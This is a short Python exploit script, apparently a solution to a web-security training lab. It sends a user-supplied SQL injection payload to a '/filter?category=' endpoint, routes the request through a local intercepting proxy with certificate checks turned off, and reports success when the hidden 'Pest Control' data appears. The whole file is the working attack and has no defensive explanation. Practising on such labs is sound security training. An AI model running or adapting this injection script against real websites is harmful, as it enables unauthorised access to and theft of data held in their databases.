#SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

import requests
import urllib3
import sys  
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def exploit_sqli(url,payload):
   url+='/filter?category='+payload
   
   r=requests.get(url,verify=False,proxies=proxies)
   if "Pest Control" in r.text:
       return True
   else:
       return False





if __name__=="__main__":
    try:
        url=sys.argv[1].strip()
        payload=sys.argv[2].strip()
    except IndexError:
        print("[-] Usage python %s <url> <payload>"%sys.argv[0])
        sys.exit()

if exploit_sqli(url,payload):
    print("[+] SQLI Successful")
else:
    print("[+] SQLI Not Successful")
